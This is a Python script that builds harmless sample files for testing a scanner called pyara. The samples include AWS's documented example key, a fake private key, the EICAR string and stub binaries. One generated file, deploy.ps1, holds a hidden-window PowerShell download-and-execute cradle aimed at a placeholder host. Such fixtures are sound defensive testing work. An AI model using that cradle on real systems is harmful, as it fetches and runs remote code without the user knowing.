"""Generate a folder of harmless test files to point pyara at.

Nothing here is real: the AWS key is Amazon's documented example key, the
private key is random base64, the "binaries" are just headers, and the
EICAR file is the standard antivirus test string. Things get assembled at
runtime so the repo itself doesn't trip secret scanners or AV.
"""
import base64
import os
import random
import sys
from pathlib import Path


def main(out="samples"):
    out = Path(out)
    (out / "project").mkdir(parents=True, exist_ok=True)
    rng = random.Random(7)

    (out / "project" / "settings.env").write_text(
        "DEBUG=true\nAWS_REGION=ap-south-1\n"
        "AWS_ACCESS_KEY_ID=" + "AKIA" + "IOSFODNN7EXAMPLE" + "\n"
    )
    (out / "project" / "notes.md").write_text("# todo\n- rotate keys\n- write tests\n")

    body = base64.encodebytes(bytes(rng.getrandbits(8) for _ in range(600))).decode()
    kind = "RSA " + "PRIVATE KEY"
    (out / "project" / "id_rsa_backup").write_text(f"-----BEGIN {kind}-----\n{body}-----END {kind}-----\n")

    (out / "project" / "deploy.ps1").write_text(
        "# found this in an old ticket\n"
        "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient)."
        "DownloadString('http://example.invalid/payload.ps1')\"\n"
    )
    (out / "project" / "cleanup.ps1").write_text("Get-ChildItem $env:TEMP | Remove-Item -Recurse -WhatIf\n")

    eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS" + "-TEST-FILE!$H+H*"
    (out / "eicar.com").write_text(eicar)

    (out / "fake_app.exe").write_bytes(b"MZ\x90\x00" + bytes(252))
    (out / "fake_lib.so").write_bytes(b"\x7fELF\x02\x01\x01" + bytes(57))
    (out / "vault.bin").write_bytes(os.urandom(64 * 1024))
    print(f"wrote samples to {out}/")


if __name__ == "__main__":
    main(*sys.argv[1:])
